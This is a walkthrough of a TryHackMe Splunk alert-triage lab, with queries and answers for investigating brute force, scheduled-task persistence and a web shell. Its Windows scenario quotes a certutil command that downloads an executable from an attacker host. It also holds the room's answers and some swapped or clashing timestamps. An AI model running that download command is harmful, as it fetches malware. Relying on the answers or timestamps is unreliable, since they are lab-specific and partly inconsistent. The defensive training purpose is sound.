# Alert Triage with Splunk - TryHackMe

> Investigate three security alerts using Splunk SIEM

**Room Link:** https://tryhackme.com/room/alerttriagewithsplunk

<img width="1765" height="897" alt="image" src="https://github.com/user-attachments/assets/16df8981-3517-49ad-8247-d87c47103173" />

---

## Scenario 1: Initial Access Alert

### Alert Details

**Name:** Brute Force Activity Detection

**Time:** 17/09/2025 9:00:21 AM

**Host:** tryhackme-2404

**Source IP:** 10.10.242.248

**Task:** Investigate and determine if suspicious

### Investigation

**Initial query:**
```spl
src_ip=10.10.242.248 action=failure
| stats count by user
```

### Questions

**Q1: Failed login attempts on john.smith?**

Count failures for user john.smith.

- Answer: `500`

---

**Q2: Duration of brute force attack in minutes?**

**First event:**
```spl
src_ip=10.10.242.248 action=failure
| table _time, user
```
Time: 2025-09-17 09:05:13.878

**Last event:**
```spl
src_ip=10.10.242.248 action=failure
| reverse
| table _time, user
```
Time: 2025-09-17 09:00:21.045

Calculate difference.

- Answer: `5`

---

**Q3: Username attacker escalated to?**

Check successful actions:
```spl
john.smith action!=failure
```

Look for session opened events.

- Answer: `root`

---

**Q4: User account created for persistence?**

Filter for root activity:
```spl
tryhackme-2404 root
```

Look for user creation events.

- Answer: `system-utm`

---

## Scenario 2: Persistence Alert

### Alert Details

**Name:** Potential Task Scheduler Persistence

**Time:** 30/08/2025 10:06:07 AM

**Host:** WIN-H015

**User:** oliver.thompson

**Task:** AssessmentTaskOne

### Investigation

**Query:**
```spl
WIN-H015 oliver.thompson AssessmentTaskOne
```

**Event ID 4698:** Scheduled task creation

**Malicious command found:**
```powershell
certutil.exe -urlcache -f http://tryhotme:9876/rv.exe C:\Users\OLIVER~1.THO\AppData\Local\Temp\3\DataCollector.exe
```

Downloads and executes malware!

### Questions

**Q1: ProcessId that created malicious task?**

Check Event ID 1 (Sysmon process creation).

- Answer: `5816`

---

**Q2: Parent process name?**

Check ParentCommandLine field.

- Answer: `cmd.exe`

---

**Q3: Local group attacker enumerated?**

Search for net.exe:
```spl
WIN-H015 net.exe
```

Look for enumeration commands.

- Answer: `Administrators`

---

**Q4: Workstation attacker logged in from?**

Filter for successful logons:
```spl
WIN-H015 oliver.thompson action=success logon
```

Check Workstation Name field.

- Answer: `DEV-QA-SERVER`

---

## Scenario 3: Web Shell Alert

### Alert Details

**Name:** Potential Web Shell Upload

**Time:** 14/09/2025 09:31:51 AM

**Resource:** http://web.trywinme.thm

**IP:** 171.251.232.40

### Investigation

**Initial query:**
```spl
171.251.232.40
| table req_time, clientip, uri, uri_path, method, status, useragent
```

**Findings:**
- UserAgent: Mozilla/5.0 (Hydra)
- Target: /wp-login.php
- Brute force → Admin access
- Web shell: b374k.php

### Questions

**Q1: When did Hydra brute force begin?**

Format: 2025-01-15 12:30:45

```spl
171.251.232.40 useragent="Mozilla/5.0 (Hydra)"
| table req_time, clientip, uri, uri_path, method, status, useragent
```

Sort ascending for first timestamp.

- Answer: `2025-09-14 21:20:27`

---

**Q2: User agent used with web shell?**

Check requests to b374k.php.

- Answer: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36`

---

**Q3: Number of requests via web shell?**

Search for web shell activity:
```spl
171.251.232.40 b374k.php
```

Count results with referrer.

- Answer: `4`

---

## Quick Reference

### Investigation Workflow

```
Alert Received
    ↓
Extract Known Indicators (IP, Host, User)
    ↓
Broad Search
    ↓
Identify Patterns (failures, successes)
    ↓
Timeline Analysis
    ↓
Lateral Movement Check
    ↓
Persistence Mechanisms
    ↓
Verdict
```

### Splunk Query Patterns

**Count by field:**
```spl
field=value | stats count by user
```

**Table results:**
```spl
field=value | table _time, field1, field2
```

**Reverse order:**
```spl
field=value | reverse
```

**Exclude values:**
```spl
field!=value
uri!="/path"
```

### Brute Force Indicators

**Typical pattern:**
1. Multiple failed logins
2. Same source IP
3. Short time window
4. Eventually successful
5. Privilege escalation
6. Persistence creation

**Key fields:**
- action (success/failure)
- src_ip
- user
- _time

### Persistence Techniques

**Windows:**
- Scheduled tasks (Event ID 4698)
- New user accounts
- Service creation
- Registry run keys

**Detection:**
- Process creation (Sysmon Event ID 1)
- Parent-child relationships
- Command line analysis
- Suspicious tools (certutil, net.exe)

### Web Attack Indicators

**Brute force:**
- Tool in UserAgent (Hydra, WPScan)
- Multiple 401/403 responses
- Target: login pages
- Eventually 200 OK

**Web shell:**
- Suspicious file names (b374k.php, shell.php)
- POST to uploaded files
- Commands in parameters
- Unusual UserAgent after compromise

**Key fields:**
- clientip
- uri / uri_path
- useragent
- status
- method
- req_time

### Common Attack Tools

**Credentials:**
- Hydra (brute force)
- Medusa
- Burp Suite

**Persistence:**
- certutil (download files)
- schtasks (scheduled tasks)
- net.exe (user/group mgmt)

**Enumeration:**
- net localgroup
- net user
- whoami

### Time Analysis

**Calculate duration:**
1. Get first event timestamp
2. Get last event timestamp
3. Calculate difference
4. Use `| reverse` for chronological order

**Sort by time:**
```spl
| sort _time
| reverse
```

### Event IDs Reference

**Windows:**
- 4624: Successful logon
- 4625: Failed logon
- 4698: Scheduled task created
- 4720: User account created

**Sysmon:**
- 1: Process creation
- 3: Network connection
- 11: File created

### Red Flags Checklist

**Authentication:**
- [ ] Multiple failures
- [ ] Successful after failures
- [ ] Unusual source IP
- [ ] Off-hours activity

**Privilege Escalation:**
- [ ] su/sudo usage
- [ ] Session for root
- [ ] Group enumeration

**Persistence:**
- [ ] New scheduled tasks
- [ ] New user accounts
- [ ] Suspicious commands
- [ ] certutil usage

**Web Activity:**
- [ ] Brute force tools
- [ ] Admin page access
- [ ] File upload
- [ ] Web shell execution

---

## Key Takeaways

- **Failed logins** indicate brute force
- **Calculate time** with first/last events
- **Privilege escalation** follows compromise
- **New accounts** = persistence
- **Scheduled tasks** with certutil = malicious
- **ProcessId** in Sysmon Event ID 1
- **Parent process** shows execution chain
- **net.exe** used for enumeration
- **Workstation name** in logon events
- **Hydra** in UserAgent = brute force
- **Web shells** execute commands
- **Referrer** shows web shell usage
- **Timeline matters** for correlation
- **Always check** parent processes
  
Happy hunting
